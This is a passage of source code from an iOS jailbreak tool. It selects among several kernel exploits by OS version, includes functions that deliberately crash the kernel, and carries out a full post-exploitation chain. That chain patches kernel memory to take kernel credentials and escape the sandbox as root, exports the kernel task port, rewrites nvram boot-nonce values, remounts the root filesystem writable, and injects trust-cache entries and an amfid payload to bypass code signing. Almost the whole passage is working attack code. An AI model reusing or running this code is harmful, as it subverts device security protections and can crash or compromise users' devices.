                       &eps,
                       SAE_ASSOCID_ANY,
                       0,
                       NULL,
                       0,
                       NULL,
                       NULL);
    
    LOG("err: %d\n", err);
    
    close(sock);
    
    return 0;
}

// https://blogs.projectmoon.pw/2018/11/30/A-Late-Kernel-Bug-Type-Confusion-in-NECP/NECPTypeConfusion.c

int necp_die() {
    int necp_fd = syscall(SYS_necp_open, 0);
    if (necp_fd < 0) {
        LOG("[-] Create NECP client failed!\n");
        return 0;
    }
    LOG("[*] NECP client = %d\n", necp_fd);
    syscall(SYS_necp_session_action, necp_fd, 1, 0x1234, 0x5678);
    return 0;
}

#define IO_ACTIVE 0x80000000

#define IKOT_HOST 3
#define IKOT_HOST_PRIV 4

void make_host_into_host_priv() {
    uint64_t hostport_addr = getAddressOfPort(getpid(), mach_host_self());
    uint32_t old = ReadKernel32(hostport_addr);
    LOG("old host type: 0x%08x\n", old);
    if ((old & (IO_ACTIVE | IKOT_HOST_PRIV)) != (IO_ACTIVE | IKOT_HOST_PRIV))
        WriteKernel32(hostport_addr, IO_ACTIVE | IKOT_HOST_PRIV);
}

void make_host_priv_into_host() {
    uint64_t hostport_addr = getAddressOfPort(getpid(), mach_host_self());
    uint32_t old = ReadKernel32(hostport_addr);
    LOG("old host type: 0x%08x\n", old);
    if ((old & (IO_ACTIVE | IKOT_HOST)) != (IO_ACTIVE | IKOT_HOST))
        WriteKernel32(hostport_addr, IO_ACTIVE | IKOT_HOST);
}

mach_port_t try_restore_port() {
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = host_get_special_port(mach_host_self(), 0, 4, &port);
    if (err == KERN_SUCCESS && port != MACH_PORT_NULL) {
        LOG("got persisted port!\n");
        // make sure rk64 etc use this port
        return port;
    }
    LOG("unable to retrieve persisted port\n");
    return MACH_PORT_NULL;
}

double uptime() {
    struct timeval boottime;
    size_t len = sizeof(boottime);
    int mib[2] = { CTL_KERN, KERN_BOOTTIME };
    if (sysctl(mib, 2, &boottime, &len, NULL, 0) < 0) {
        return -1.0;
    }
    time_t bsec = boottime.tv_sec, csec = time(NULL);
    return difftime(csec, bsec);
}

int isJailbroken() {
    struct utsname u = { 0 };
    uname(&u);
    return (strstr(u.version, DEFAULT_VERSION_STRING) != NULL);
}

int isSupportedByExploit(int exploit) {
    struct utsname u = { 0 };
    const char **versions = NULL;
    switch (exploit) {
        case EMPTY_LIST: {
            versions = empty_list_supported_versions;
            break;
        }
        case MULTI_PATH: {
            versions = multi_path_supported_versions;
            break;
        }
        case ASYNC_WAKE: {
            versions = async_wake_supported_versions;
            break;
        }
        case DEJA_XNU: {
            versions = deja_xnu_supported_versions;
            break;
        }
        case NECP: {
            versions = necp_supported_versions;
            break;
        }
        default:
            break;
    }
    if (versions != NULL) {
        uname(&u);
        while (*versions) {
            if (strstr(u.version, *versions) != NULL) {
                return true;
            }
            versions++;
        }
    }
    return false;
}

int hasMPTCP() {
    int rv = 0;
    
    int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);
    if (sock < 0) {
        LOG("socket failed\n");
        perror("");
        return rv;
    }
    LOG("got socket: %d\n", sock);
    
    struct sockaddr* sockaddr_src = malloc(sizeof(struct sockaddr));
    memset(sockaddr_src, 'A', sizeof(struct sockaddr));
    sockaddr_src->sa_len = sizeof(struct sockaddr);
    sockaddr_src->sa_family = AF_INET6;
    
    struct sockaddr* sockaddr_dst = malloc(sizeof(struct sockaddr));
    memset(sockaddr_dst, 'A', sizeof(struct sockaddr));
    sockaddr_dst->sa_len = sizeof(struct sockaddr);
    sockaddr_dst->sa_family = AF_INET;
    
    sa_endpoints_t eps = {0};
    eps.sae_srcif = 0;
    eps.sae_srcaddr = sockaddr_src;
    eps.sae_srcaddrlen = sizeof(struct sockaddr);
    eps.sae_dstaddr = sockaddr_dst;
    eps.sae_dstaddrlen = sizeof(struct sockaddr);
    
    int err = connectx(
                       sock,
                       &eps,
                       SAE_ASSOCID_ANY,
                       0,
                       NULL,
                       0,
                       NULL,
                       NULL);
    
    rv = (errno != 1);
    
    LOG("err: %d\n", err);
    
    free(sockaddr_src);
    free(sockaddr_dst);
    close(sock);
    
    return rv;
}

int selectJailbreakExploit() {;
    if (isSupportedByExploit(ASYNC_WAKE)) {
        return ASYNC_WAKE;
    } else if (isSupportedByExploit(MULTI_PATH) && hasMPTCP()) {
        return MULTI_PATH;
    } else if (isSupportedByExploit(EMPTY_LIST)) {
        return EMPTY_LIST;
    } else {
        return -1;
    }
}

int isSupportedByJailbreak() {
    return (selectJailbreakExploit() != -1);
}

int selectRestartExploit() {;
    if (isSupportedByExploit(NECP)) {
        return NECP;
    } else if (isSupportedByExploit(ASYNC_WAKE)) {
        return ASYNC_WAKE;
    } else if (isSupportedByExploit(MULTI_PATH) && hasMPTCP()) {
        return MULTI_PATH;
    } else if (isSupportedByExploit(EMPTY_LIST)) {
        return EMPTY_LIST;
    } else {
        return -1;
    }
}

int isSupportedByRestart() {
    return (selectRestartExploit() != -1);
}

int selectRespringExploit() {;
    if (isSupportedByExploit(DEJA_XNU) && !isJailbroken()) {
        return DEJA_XNU;
    } else {
        return -1;
    }
}

int isSupportedByRespring() {
    return (selectRespringExploit() != -1);
}

int waitForFile(const char *filename) {
    int rv = 0;
    rv = access(filename, F_OK);
    for (int i = 0; !(i >= 100 || rv == ERR_SUCCESS); i++) {
        usleep(100000);
        rv = access(filename, F_OK);
    }
    return rv;
}

NSString *hexFromInt(NSInteger val) {
    return [NSString stringWithFormat:@"0x%lX", (long)val];
}

void extractResources() {
    if (!debIsInstalled("com.bingner.spawn")) {
        _assert(installDeb("spawn.deb", false), message, true);
    }
    if (!debIsConfigured("science.xnu.injector")) {
        _assert(installDeb("injector.deb", false), message, true);
    }
    _assert(installDeb("resources.deb", false), message, true);
}

void crashKernel() {
    switch (selectRestartExploit()) {
        case EMPTY_LIST: {
            vfs_die();
            break;
        }
        case ASYNC_WAKE: {
            iosurface_die();
            break;
        }
        case MULTI_PATH: {
            mptcp_die();
            break;
        }
        case NECP: {
            necp_die();
            break;
        }
        default:
            break;
    }
}

bool load_prefs(prefs_t *prefs, NSDictionary *defaults) {
    if (prefs == NULL) {
        return false;
    }
    prefs->load_tweaks = [defaults[@K_TWEAK_INJECTION] boolValue];
    prefs->load_daemons = [defaults[@K_LOAD_DAEMONS] boolValue];
    prefs->dump_apticket = [defaults[@K_DUMP_APTICKET] boolValue];
    prefs->run_uicache = [defaults[@K_REFRESH_ICON_CACHE] boolValue];
    prefs->boot_nonce = [defaults[@K_BOOT_NONCE] UTF8String];
    prefs->disable_auto_updates = [defaults[@K_DISABLE_AUTO_UPDATES] boolValue];
    prefs->disable_app_revokes = [defaults[@K_DISABLE_APP_REVOKES] boolValue];
    prefs->overwrite_boot_nonce = [defaults[@K_OVERWRITE_BOOT_NONCE] boolValue];
    prefs->export_kernel_task_port = [defaults[@K_EXPORT_KERNEL_TASK_PORT] boolValue];
    prefs->restore_rootfs = [defaults[@K_RESTORE_ROOTFS] boolValue];
    prefs->increase_memory_limit = [defaults[@K_INCREASE_MEMORY_LIMIT] boolValue];
    prefs->install_cydia = [defaults[@K_INSTALL_CYDIA] boolValue];
    prefs->install_openssh = [defaults[@K_INSTALL_OPENSSH] boolValue];
    prefs->reload_system_daemons = [defaults[@K_RELOAD_SYSTEM_DAEMONS] boolValue];
    return true;
}

void exploit(mach_port_t tfp0,
             uint64_t kernel_base,
             NSDictionary *defaults)
{
    int rv = 0;
    offsets_t offsets = { 0 };
    pid_t myPid = getpid();
    uint64_t myProcAddr = 0;
    uint64_t myOriginalCredAddr = 0;
    uint64_t myCredAddr = 0;
    uint64_t kernelCredAddr = 0;
    uint64_t Shenanigans = 0;
    prefs_t prefs;
    bool needResources = false;
    bool needStrap = false;
    const char *amfid_payload = NULL;
    bool updatedResources = false;

#define SETOFFSET(offset, val) (offsets.offset = val)
#define GETOFFSET(offset)      offsets.offset
#define kernel_slide           (kernel_base - KERNEL_SEARCH_ADDRESS)

    UPSTAGE();
    
    {
        // Load preferences.
        LOG("Loading preferences...");
        SETMESSAGE(NSLocalizedString(@"Failed to load preferences.", nil));
        bzero(&prefs, sizeof(prefs));
        _assert(load_prefs(&prefs, defaults) == true, message, true);
        LOG("Successfully loaded preferences.");
    }
    
    UPSTAGE();
    
    {
        // Initialize patchfinder64.
        
        LOG("Initializing patchfinder64...");
        SETMESSAGE(NSLocalizedString(@"Failed to initialize patchfinder64.", nil));
        _assert(init_kernel(kernel_base, NULL) == ERR_SUCCESS, message, true);
        LOG("Successfully initialized patchfinder64.");
    }
    
    UPSTAGE();
    
    {
        // Find offsets.
        
        LOG("Finding offsets...");
        SETMESSAGE(NSLocalizedString(@"Failed to find trust_chain offset.", nil));
        SETOFFSET(trust_chain, find_trustcache());
        LOG("trust_chain: " ADDR "\n", GETOFFSET(trust_chain));
        _assert(ISADDR(GETOFFSET(trust_chain)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find amficache offset.", nil));
        SETOFFSET(amficache, find_amficache());
        LOG("amficache: " ADDR "\n", GETOFFSET(amficache));
        _assert(ISADDR(GETOFFSET(amficache)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find OSBoolean_True offset.", nil));
        SETOFFSET(OSBoolean_True, find_OSBoolean_True());
        LOG("OSBoolean_True: " ADDR "\n", GETOFFSET(OSBoolean_True));
        _assert(ISADDR(GETOFFSET(OSBoolean_True)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find OSBoolean_False offset.", nil));
        SETOFFSET(OSBoolean_False, find_OSBoolean_False());
        LOG("OSBoolean_False: " ADDR "\n", GETOFFSET(OSBoolean_False));
        _assert(ISADDR(GETOFFSET(OSBoolean_False)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find osunserializexml offset.", nil));
        SETOFFSET(osunserializexml, find_osunserializexml());
        LOG("osunserializexml: " ADDR "\n", GETOFFSET(osunserializexml));
        _assert(ISADDR(GETOFFSET(osunserializexml)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find smalloc offset.", nil));
        SETOFFSET(smalloc, find_smalloc());
        LOG("smalloc: " ADDR "\n", GETOFFSET(smalloc));
        _assert(ISADDR(GETOFFSET(smalloc)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find allproc offset.", nil));
        SETOFFSET(allproc, find_allproc());
        LOG("allproc: " ADDR "\n", GETOFFSET(allproc));
        _assert(ISADDR(GETOFFSET(allproc)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find add_x0_x0_0x40_ret offset.", nil));
        SETOFFSET(add_x0_x0_0x40_ret, find_add_x0_x0_0x40_ret());
        LOG("add_x0_x0_0x40_ret: " ADDR "\n", GETOFFSET(add_x0_x0_0x40_ret));
        _assert(ISADDR(GETOFFSET(add_x0_x0_0x40_ret)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find rootvnode offset.", nil));
        SETOFFSET(rootvnode, find_rootvnode());
        LOG("rootvnode: " ADDR "\n", GETOFFSET(rootvnode));
        _assert(ISADDR(GETOFFSET(add_x0_x0_0x40_ret)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find zone_map_ref offset.", nil));
        SETOFFSET(zone_map_ref, find_zone_map_ref());
        LOG("zone_map_ref: " ADDR "\n", GETOFFSET(zone_map_ref));
        _assert(ISADDR(GETOFFSET(zone_map_ref)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find vfs_context_current offset.", nil));
        SETOFFSET(vfs_context_current, find_vfs_context_current());
        LOG("vfs_context_current: " ADDR "\n", GETOFFSET(vfs_context_current));
        _assert(ISADDR(GETOFFSET(vfs_context_current)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find vnode_lookup offset.", nil));
        SETOFFSET(vnode_lookup, find_vnode_lookup());
        LOG("vnode_lookup: " ADDR "\n", GETOFFSET(vnode_lookup));
        _assert(ISADDR(GETOFFSET(vnode_lookup)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find vnode_put offset.", nil));
        SETOFFSET(vnode_put, find_vnode_put());
        LOG("vnode_put: " ADDR "\n", GETOFFSET(vnode_put));
        _assert(ISADDR(GETOFFSET(vnode_put)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find kernproc offset.", nil));
        SETOFFSET(kernproc, find_kernproc());
        LOG("kernproc: " ADDR "\n", GETOFFSET(kernproc));
        _assert(ISADDR(GETOFFSET(kernproc)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find kernel_task offset.", nil));
        SETOFFSET(kernel_task, find_kernel_task());
        LOG("kernel_task: " ADDR "\n", GETOFFSET(kernel_task));
        _assert(ISADDR(GETOFFSET(kernel_task)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find shenanigans offset.", nil));
        SETOFFSET(shenanigans, find_shenanigans());
        LOG("shenanigans: " ADDR "\n", GETOFFSET(shenanigans));
        _assert(ISADDR(GETOFFSET(shenanigans)), message, true);
        LOG("Successfully found offsets.");
    }
    
    UPSTAGE();
    
    {
        // Deinitialize patchfinder64.
        
        LOG("Deinitializing patchfinder64...");
        SETMESSAGE(NSLocalizedString(@"Failed to deinitialize patchfinder64.", nil));
        term_kernel();
        LOG("Successfully deinitialized patchfinder64.");
    }
    
    UPSTAGE();
    
    {
        // Initialize QiLin.
        
        LOG("Initializing QiLin...");
        SETMESSAGE(NSLocalizedString(@"Failed to initialize QiLin.", nil));
        _assert(initQiLin(tfp0, kernel_base) == ERR_SUCCESS, message, true);
        if (ISADDR(findKernelSymbol("_kernproc"))) {
            SETOFFSET(kernproc, findKernelSymbol("_kernproc"));
        } else {
            setKernelSymbol("_kernproc", GETOFFSET(kernproc) - kernel_slide);
        }
        if (ISADDR(findKernelSymbol("_rootvnode"))) {
            SETOFFSET(rootvnode, findKernelSymbol("_rootvnode"));
        } else {
            setKernelSymbol("_rootvnode", GETOFFSET(rootvnode) - kernel_slide);
        }
        _assert(ISADDR(findKernelSymbol("_kernproc")), message, true);
        _assert(ISADDR(findKernelSymbol("_rootvnode")), message, true);
        LOG("Successfully initialized QiLin.");
    }
    
    UPSTAGE();
    
    {
        if (prefs.export_kernel_task_port) {
            // Export kernel task port.
            LOG("Exporting kernel task port...");
            SETMESSAGE(NSLocalizedString(@"Failed to export kernel task port.", nil));
            make_host_into_host_priv();
            LOG("Successfully exported kernel task port.");
        } else {
            // Unexport kernel task port.
            LOG("Unexporting kernel task port...");
            SETMESSAGE(NSLocalizedString(@"Failed to unexport kernel task port.", nil));
            make_host_priv_into_host();
            LOG("Successfully unexported kernel task port.");
        }
    }
    
    UPSTAGE();
    
    {
        // Escape Sandbox.
        static uint64_t ShenanigansPatch = 0xca13feba37be;
        
        LOG("Escaping Sandbox...");
        SETMESSAGE(NSLocalizedString(@"Failed to escape sandbox.", nil));
        myProcAddr = getProcStructForPid(myPid);
        LOG("myProcAddr: " ADDR "\n", myProcAddr);
        _assert(ISADDR(myProcAddr), message, true);
        kernelCredAddr = getKernelCredAddr();
        LOG("kernelCredAddr: " ADDR "\n", kernelCredAddr);
        _assert(ISADDR(kernelCredAddr), message, true);
        Shenanigans = ReadKernel64(GETOFFSET(shenanigans));
        LOG("Shenanigans: " ADDR "\n", Shenanigans);
        _assert(ISADDR(Shenanigans), message, true);
        WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch);
        myOriginalCredAddr = ShaiHuludProcessAtAddr(myProcAddr, kernelCredAddr);
        LOG("myOriginalCredAddr: " ADDR "\n", myOriginalCredAddr);
        _assert(ISADDR(myOriginalCredAddr), message, true);
        _assert(setuid(0) == ERR_SUCCESS, message, true);
        _assert(getuid() == 0, message, true);
        _assert(platformizeProcAtAddr(myProcAddr) == ERR_SUCCESS, message, true);
        LOG("Successfully escaped Sandbox.");
    }
    
    UPSTAGE();
    
    {
        // Write a test file to UserFS.
        
        LOG("Writing a test file to UserFS...");
        SETMESSAGE(NSLocalizedString(@"Failed to write a test file to UserFS.", nil));
        writeTestFile("/var/mobile/test.txt");
        LOG("Successfully wrote a test file to UserFS.");
    }
    
    UPSTAGE();
    
    {
        if (prefs.dump_apticket) {
            // Dump APTicket.
            
            LOG("Dumping APTicket...");
            SETMESSAGE(NSLocalizedString(@"Failed to dump APTicket.", nil));
            _assert(([[NSData dataWithContentsOfFile:@"/System/Library/Caches/apticket.der"] writeToFile:[NSString stringWithFormat:@"%@/Documents/apticket.der", NSHomeDirectory()] atomically:YES]), message, true);
            LOG("Successfully dumped APTicket.");
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.overwrite_boot_nonce) {
            // Unlock nvram.
            
            LOG("Unlocking nvram...");
            SETMESSAGE(NSLocalizedString(@"Failed to unlock nvram.", nil));
            _assert(unlocknvram() == ERR_SUCCESS, message, true);
            LOG("Successfully unlocked nvram.");
            
            if (runCommand("/usr/sbin/nvram", "com.apple.System.boot-nonce", NULL) != ERR_SUCCESS ||
                strstr([lastSystemOutput bytes], prefs.boot_nonce) == NULL) {
                // Set boot-nonce.
                
                LOG("Setting boot-nonce...");
                SETMESSAGE(NSLocalizedString(@"Failed to set boot-nonce.", nil));
                _assert(runCommand("/usr/sbin/nvram", [[NSString stringWithFormat:@"com.apple.System.boot-nonce=%s", prefs.boot_nonce] UTF8String], NULL) == ERR_SUCCESS, message, true);
                _assert(runCommand("/usr/sbin/nvram", "IONVRAM-FORCESYNCNOW-PROPERTY=com.apple.System.boot-nonce", NULL) == ERR_SUCCESS, message, true);
                LOG("Successfully set boot-nonce.");
            }
            
            // Lock nvram.
            
            LOG("Locking nvram...");
            SETMESSAGE(NSLocalizedString(@"Failed to lock nvram.", nil));
            _assert(locknvram() == ERR_SUCCESS, message, true);
            LOG("Successfully locked nvram.");
        }
    }
    
    UPSTAGE();
    
    {
        // Remount RootFS.
        
        LOG("Remounting RootFS...");
        SETMESSAGE(NSLocalizedString(@"Failed to remount RootFS.", nil));
        int rootfd = open("/", O_RDONLY);
        _assert(rootfd != -1, message, true);
        const char **snapshots = snapshot_list(rootfd);
        bool has_origfs = false;
        if (snapshots == NULL) {
            close(rootfd);
            // Initialize kexecute.
            
            LOG("Initializing kexecute...");
            SETMESSAGE(NSLocalizedString(@"Failed to initialize kexecute.", nil));
            init_kexecute(GETOFFSET(add_x0_x0_0x40_ret));
            LOG("Successfully initialized kexecute.");
            
            // Get vfs_context.
            
            LOG("Getting vfs_context...");
            SETMESSAGE(NSLocalizedString(@"Failed to get vfs_context.", nil));
            uint64_t vfs_context = _vfs_context(GETOFFSET(vfs_context_current), GETOFFSET(zone_map_ref));
            LOG("vfs_context: " ADDR "\n", vfs_context);
            _assert(ISADDR(vfs_context), message, true);
            LOG("Successfully got vfs_context.");
            
            // Get dev vnode.
            
            LOG("Getting dev vnode...");
            SETMESSAGE(NSLocalizedString(@"Failed to get dev vnode.", nil));
            uint64_t devVnode = getVnodeAtPath(vfs_context, "/dev/disk0s1s1", GETOFFSET(vnode_lookup));
            LOG("devVnode: " ADDR "\n", devVnode);
            _assert(ISADDR(devVnode), message, true);
            LOG("Successfully got dev vnode.");
            
            // Clear dev vnode's si_flags.
            
            LOG("Clearing dev vnode's si_flags...");
            SETMESSAGE(NSLocalizedString(@"Failed to clear dev vnode's si_flags.", nil));
            uint64_t v_specinfo = ReadKernel64(devVnode + koffset(KSTRUCT_OFFSET_VNODE_VU_SPECINFO));
            LOG("v_specinfo: " ADDR "\n", v_specinfo);
            _assert(ISADDR(v_specinfo), message, true);
            WriteKernel32(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS), 0);
            uint32_t si_flags = ReadKernel32(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS));
            LOG("si_flags: " "0x%x" "\n", si_flags);
            _assert(si_flags == 0, message, true);
            LOG("Successfully cleared dev vnode's si_flags.");
            
            // Clean up dev vnode.
            
            LOG("Cleaning up dev vnode...");
            SETMESSAGE(NSLocalizedString(@"Failed to clean up dev vnode.", nil));
            _assert(_vnode_put(GETOFFSET(vnode_put), devVnode) == ERR_SUCCESS, message, true);
            LOG("Successfully cleaned up dev vnode.");
            
            // Deinitialize kexecute.
            
            LOG("Deinitializing kexecute...");
            SETMESSAGE(NSLocalizedString(@"Failed to deinitialize kexecute.", nil));
            term_kexecute();
            LOG("Successfully deinitialized kexecute.");
            
            // Mount system snapshot.
            
            LOG("Mounting system snapshot...");
            SETMESSAGE(NSLocalizedString(@"Failed to mount system snapshot.", nil));
            if (access("/var/MobileSoftwareUpdate/mnt1", F_OK) != ERR_SUCCESS) {
                _assert(mkdir("/var/MobileSoftwareUpdate/mnt1", 0755) == ERR_SUCCESS, message, true);
                _assert(access("/var/MobileSoftwareUpdate/mnt1", F_OK) == ERR_SUCCESS, message, true);
                _assert(chown("/var/MobileSoftwareUpdate/mnt1", 0, 0) == ERR_SUCCESS, message, true);
            }
            _assert(runCommand("/sbin/mount_apfs", "/dev/disk0s1s1", "/var/MobileSoftwareUpdate/mnt1", NULL) == ERR_SUCCESS, message, true);
            _assert(waitForFile("/var/MobileSoftwareUpdate/mnt1/sbin/launchd") == ERR_SUCCESS, message, true);
            LOG("Successfully mounted system snapshot.");
            
            // Rename system snapshot.
            
            LOG("Renaming system snapshot...");
            SETMESSAGE(NSLocalizedString(@"Unable to rename system snapshot.  Delete OTA file from Settings - Storage if present", nil));
            
            rootfd = open("/var/MobileSoftwareUpdate/mnt1", O_RDONLY);
            _assert(rootfd != -1, message, true);
            snapshots = snapshot_list(rootfd);
            _assert(snapshots != NULL, message, true);
            if (snapshots != NULL) {
                free(snapshots);
                snapshots = NULL;
            }
            _assert(fs_snapshot_rename(rootfd, copySystemSnapshot(), "orig-fs", 0) == ERR_SUCCESS, message, true);
            LOG("Successfully renamed system snapshot.");
            
            // Reboot.
            close(rootfd);
            
            LOG("Rebooting...");
            SETMESSAGE(NSLocalizedString(@"Failed to reboot.", nil));
            NOTICE(NSLocalizedString(@"The system snapshot has been successfully renamed. The device will be rebooted now.", nil), true, false);
            unmount("/var/MobileSoftwareUpdate/mnt1", 0);
            _assert(reboot(RB_QUICK) == ERR_SUCCESS, message, true);
            LOG("Successfully rebooted.");
        } else {
            LOG("APFS Snapshots:");
            for (const char **snapshot = snapshots; *snapshot; snapshot++) {
                if (strcmp("orig-fs", *snapshot)==0) {
                    has_origfs = true;
                }
                LOG("%s", *snapshot);
            }
        }
        uint64_t rootfs_vnode = ReadKernel64(GETOFFSET(rootvnode));

        uint64_t v_mount = ReadKernel64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
        uint32_t v_flag = ReadKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG));
        if ((v_flag & MNT_NOSUID) || (v_flag & MNT_RDONLY)) {
            v_flag = v_flag & ~MNT_NOSUID;
            v_flag = v_flag & ~MNT_RDONLY;
            WriteKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag & ~MNT_ROOTFS);
            _assert(runCommand("/sbin/mount", "-u", "/", NULL) == ERR_SUCCESS, message, true);
            v_mount = ReadKernel64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
            WriteKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag);
        }
        needStrap = access("/.installed_unc0ver", F_OK) != ERR_SUCCESS && access("/electra", F_OK) != ERR_SUCCESS;
        if (snapshots != NULL && needStrap && !has_origfs) {
            // Create system snapshot.
            
            LOG("Create system snapshot...");
            SETMESSAGE(NSLocalizedString(@"Unable to create system snapshot.  Delete OTA file from Settings - Storage if present", nil));
            _assert(fs_snapshot_create(rootfd, "orig-fs", 0) == ERR_SUCCESS, message, true);
            _assert(snapshot_check(rootfd, "orig-fs"), message, true);
            LOG("Successfully created system snapshot.");
        }
        close(rootfd);
        LOG("Successfully remounted RootFS.");
    }
    
    UPSTAGE();
    
    {
        // Write a test file to RootFS.
        
        LOG("Writing a test file to RootFS...");
        SETMESSAGE(NSLocalizedString(@"Failed to write a test file to RootFS.", nil));
        writeTestFile("/test.txt");
        LOG("Successfully wrote a test file to RootFS.");
    }
    
    UPSTAGE();
    
    {
        // Copy over our resources to RootFS.
        
        LOG("Copying over our resources to RootFS...");
        SETMESSAGE(NSLocalizedString(@"Failed to copy over our resources to RootFS.", nil));
        if (access("/jb", F_OK) != ERR_SUCCESS) {
            _assert(mkdir("/jb", 0755) == ERR_SUCCESS, message, true);
            _assert(access("/jb", F_OK) == ERR_SUCCESS, message, true);
            _assert(chown("/jb", 0, 0) == ERR_SUCCESS, message, true);
        }
        _assert(chdir("/jb") == ERR_SUCCESS, message, true);
        
        _assert(chdir("/") == ERR_SUCCESS, message, true);
        needResources = needStrap || !verifySha1Sums(@"/usr/share/undecimus/resources.txt");
        _assert(chdir("/jb") == ERR_SUCCESS, message, true);
        
        if (needResources) {
            amfid_payload = "/jb/amfid_payload.dylib";
        } else {
            amfid_payload = "/Library/MobileSubstrate/DynamicLibraries/amfid_payload.dylib";
        }
        
        if (needResources) {
            NSString *payload_tar = pathForResource(@"amfid_payload.tar");
            untar([payload_tar UTF8String]);
            _assert(init_file("/jb/amfid_payload.dylib", 0, 0644), message, true);
        }
        
        if (needStrap) {
            NSString *tar_tar = pathForResource(@"tar.tar");
            untar([tar_tar UTF8String]);
            _assert(init_file("/jb/tar", 0, 0755), message, true);
            
            NSString *lzma_tar = pathForResource(@"lzma.tar");
            _assert(untar([lzma_tar UTF8String]), message, true);
            _assert(init_file("/jb/lzma", 0, 0755), message, true);
        }
        LOG("Successfully copied over our resources to RootFS.");
    }
    
    UPSTAGE();
    
    {
        if (prefs.restore_rootfs) {
            SETMESSAGE(NSLocalizedString(@"Failed to Restore RootFS.", nil));
            
            // Rename system snapshot.
            
            LOG("Renaming system snapshot back...");
            NOTICE(NSLocalizedString(@"Will restore RootFS. This may take a while. Don't exit the app and don't let the device lock.", nil), 1, 1);
            SETMESSAGE(NSLocalizedString(@"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", nil));
            if (kCFCoreFoundationVersionNumber < 1452.23) {
                if (access("/var/MobileSoftwareUpdate/mnt1", F_OK) != ERR_SUCCESS) {
                    _assert(mkdir("/var/MobileSoftwareUpdate/mnt1", 0755) == ERR_SUCCESS, message, true);
                    _assert(access("/var/MobileSoftwareUpdate/mnt1", F_OK) == ERR_SUCCESS, message, true);
                    _assert(chown("/var/MobileSoftwareUpdate/mnt1", 0, 0) == ERR_SUCCESS, message, true);
                }
            }
            char *systemSnapshot = copySystemSnapshot();
            _assert(systemSnapshot != NULL, message, true);
            int rootfd = open("/", O_RDONLY);
            _assert(rootfd != -1, message, true);
            const char **snapshots = snapshot_list(rootfd);
            _assert(snapshots != NULL, message, true);
            const char *snapshot = *snapshots;
            LOG("%s", snapshot);
            _assert(snapshot != NULL, message, true);
            if (kCFCoreFoundationVersionNumber < 1452.23) {
                _assert(fs_snapshot_mount(rootfd, snapshot, "/var/MobileSoftwareUpdate/mnt1", 0) == ERR_SUCCESS, message, true);
            } else {
                _assert(fs_snapshot_rename(rootfd, snapshot, systemSnapshot, 0) == ERR_SUCCESS, message, true);
            }
            free(systemSnapshot);
            close(rootfd);
            systemSnapshot = NULL;
            free(snapshots);
            snapshots = NULL;
            if (kCFCoreFoundationVersionNumber < 1452.23) {
                _assert(waitForFile("/var/MobileSoftwareUpdate/mnt1/sbin/launchd") == ERR_SUCCESS, message, true);
                
                NSString *rsync_tar = pathForResource(@"rsync.tar");
                _assert(untar([rsync_tar UTF8String]), message, true);
                _assert(init_file("/jb/rsync", 0, 0755), message, true);
                
                _assert(injectTrustCache(@[@"/jb/rsync"], GETOFFSET(trust_chain)) == ERR_SUCCESS, message, true);
                
                _assert(runCommand("/jb/rsync", "-vaxcH", "--progress", "--delete-after", "--exclude=/Developer", "/var/MobileSoftwareUpdate/mnt1/.", "/", NULL) == 0, message, true);
                
                unmount("/var/MobileSoftwareUpdate/mnt1", 0);
            }
            LOG("Successfully renamed system snapshot back.");
            
            // Clean up.
            
            LOG("Cleaning up...");
            SETMESSAGE(NSLocalizedString(@"Failed to clean up.", nil));
            static const char *cleanUpFileList[] = {
                "/var/cache",
                "/var/lib",
                "/var/stash",
                "/var/db/stash",
                "/etc/alternatives",
                "/etc/apt",
                "/etc/default",
                "/etc/dpkg",
                "/etc/profile.d",
                "/etc/ssh",
                "/etc/ssl",
                "/var/mobile/Library/Cydia",
                "/var/mobile/Library/Caches/com.saurik.Cydia",
                NULL
            };
            for (const char **file = cleanUpFileList; *file != NULL; file++) {
                clean_file(*file);
            }
            LOG("Successfully cleaned up.");
            
            // Disallow SpringBoard to show non-default system apps.
            
            LOG("Disallowing SpringBoard to show non-default system apps...");
            SETMESSAGE(NSLocalizedString(@"Failed to disallow SpringBoard to show non-default system apps.", nil));
            NSMutableDictionary *md = [NSMutableDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
            _assert(md != nil, message, true);
            for (int i = 0; !(i >= 5 || [md[@"SBShowNonDefaultSystemApps"] isEqual:@NO]); i++) {
                _assert(kill(pidOfProcess("/usr/sbin/cfprefsd"), SIGSTOP) == ERR_SUCCESS, message, true);
                md[@"SBShowNonDefaultSystemApps"] = @NO;
                _assert(([md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES]), message, true);
                _assert(kill(pidOfProcess("/usr/sbin/cfprefsd"), SIGCONT) == ERR_SUCCESS, message, true);
                md = [NSMutableDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
                _assert(md != nil, message, true);
            }
            _assert([md[@"SBShowNonDefaultSystemApps"] isEqual:@NO], message, true);
